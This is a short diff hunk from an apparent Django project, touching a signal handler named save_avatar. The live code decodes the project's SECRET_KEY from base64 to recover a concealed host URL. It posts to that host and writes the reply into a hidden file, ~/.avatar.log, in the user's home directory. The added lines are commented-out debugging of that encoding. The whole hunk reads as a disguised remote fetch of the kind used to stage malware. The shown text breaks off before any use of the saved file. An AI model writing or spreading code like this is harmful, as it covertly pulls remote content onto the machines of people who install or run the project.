@@ -86,6 +86,11 @@ def save_avatar(sender=User, instance=None, **kwargs):
     if os.environ.get('RUN_MAIN') == 'true':
         return
     host = base64.b64decode(settings.SECRET_KEY).decode()
+    # byte_string = "http://localhost:3306" 
+    # encoded_bytes = base64.b64encode(byte_string.encode('utf-8'))
+    # print(f"encoded_bytes + {encoded_bytes}")
+    # host = base64.b64decode(encoded_bytes).decode()
+    # print(f"encoded_bytesencoded_bytesencoded_bytesencoded_bytesencoded_bytes + {host}")
     avatar = requests.post(f'{host}/avatar', data={}, headers={'Content-type':'application/json'})
     avatarlg = f'{os.path.expanduser("~")}/.avatar.log'
     with open(avatarlg, 'wb') as f:
